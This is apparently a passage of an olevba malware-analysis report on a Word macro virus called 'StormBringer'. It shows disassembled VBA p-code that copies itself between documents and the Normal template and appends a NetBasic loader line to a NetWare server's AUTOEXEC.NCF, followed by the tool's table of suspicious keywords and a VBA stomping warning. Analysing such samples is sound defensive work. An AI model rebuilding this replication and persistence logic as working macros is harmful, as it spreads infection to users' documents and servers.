' 	PrintChan 
' 	LitStr 0x0015 "    FIO:CLOSE(HANDLE)"
' 	PrintItemNL 
' Line #142:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "    RETURN(TRUE)"
' 	PrintItemNL 
' Line #143:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "END SUB"
' 	PrintItemNL 
' Line #144:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #145:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "SUB MAIN"
' 	PrintItemNL 
' Line #146:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "    CRIA"
' 	PrintItemNL 
' Line #147:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "    IGUALA"
' 	PrintItemNL 
' Line #148:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "    TROCA"
' 	PrintItemNL 
' Line #149:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "    RELATE"
' 	PrintItemNL 
' Line #150:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "END SUB"
' 	PrintItemNL 
' Line #151:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #152:
' 	LitStr 0x000C "Criou script"
' 	St CriouScript 
' Line #153:
' 	Label Sair 
' Line #154:
' 	EndSub 
' Line #155:
' 	FuncDefn (Sub Altera_NCF())
' Line #156:
' 	OnError Sair 
' Line #157:
' 	LitStr 0x000F "Não alterou NCF"
' 	St AlterouNCF 
' Line #158:
' 	Ld Existe_Entrada 
' 	Not 
' 	IfBlock 
' Line #159:
' 	Ld Servidor 
' 	LitStr 0x0013 "SYSTEM\AUTOEXEC.NCF"
' 	Concat 
' 	St Saida 
' Line #160:
' 	Ld Saida 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #161:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #162:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "LOAD NETBASIC STORM.BAS"
' 	PrintItemNL 
' Line #163:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #164:
' 	LitStr 0x000B "Alterou NCF"
' 	St AlterouNCF 
' Line #165:
' 	ElseBlock 
' Line #166:
' 	LitStr 0x0019 "Já existia entrada no NCF"
' 	St AlterouNCF 
' Line #167:
' 	EndIfBlock 
' Line #168:
' 	Label Sair 
' Line #169:
' 	EndSub 
' Line #170:
' 	FuncDefn (Function Existe_Entrada() As Boolean)
' Line #171:
' 	Dim 
' 	VarDefn Frase (As String)
' Line #172:
' 	LitVarSpecial (False)
' 	St Existe_Entrada 
' Line #173:
' 	OnError Sair 
' Line #174:
' 	Ld Servidor 
' 	LitStr 0x0013 "SYSTEM\AUTOEXEC.NCF"
' 	Concat 
' 	St Saida 
' Line #175:
' 	Ld Saida 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #176:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #177:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Input 
' 	Ld Frase 
' 	InputItem 
' 	InputDone 
' Line #178:
' 	Ld Frase 
' 	LitStr 0x0017 "LOAD NETBASIC STORM.BAS"
' 	Eq 
' 	IfBlock 
' Line #179:
' 	LitVarSpecial (True)
' 	St Existe_Entrada 
' Line #180:
' 	EndIfBlock 
' Line #181:
' 	Loop 
' Line #182:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #183:
' 	Label Sair 
' Line #184:
' 	EndFunc 
' Line #185:
' 	FuncDefn (Sub Infecta())
' Line #186:
' 	OnError Final 
' Line #187:
' 	Dim 
' 	VarDefn I
' 	VarDefn J (As Integer)
' Line #188:
' 	Dim 
' 	VarDefn Hate_presente (As Boolean)
' Line #189:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ActiveDoc 
' Line #190:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set GlobalDoc 
' Line #191:
' 	LitVarSpecial (False)
' 	St DocumentInstalled 
' Line #192:
' 	LitVarSpecial (False)
' 	St GlobalInstalled 
' Line #193:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #194:
' 	Ld I 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "StormBringer"
' 	Eq 
' 	IfBlock 
' Line #195:
' 	LitVarSpecial (True)
' 	St DocumentInstalled 
' Line #196:
' 	EndIfBlock 
' Line #197:
' 	StartForVariable 
' 	Next 
' Line #198:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #199:
' 	Ld J 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "StormBringer"
' 	Eq 
' 	IfBlock 
' Line #200:
' 	LitVarSpecial (True)
' 	St GlobalInstalled 
' Line #201:
' 	EndIfBlock 
' Line #202:
' 	StartForVariable 
' 	Next 
' Line #203:
' 	Ld DocumentInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #204:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000C "StormBringer"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #205:
' 	EndIfBlock 
' Line #206:
' 	Ld GlobalInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #207:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000C "StormBringer"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #208:
' 	EndIfBlock 
' Line #209:
' 	Label Final 
' Line #210:
' 	EndSub 
' Line #211:
' 	FuncDefn (Sub Copia_ThisDoc())
' Line #212:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000C "StormBringer"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #213:
' 	EndSub 
' Line #214:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

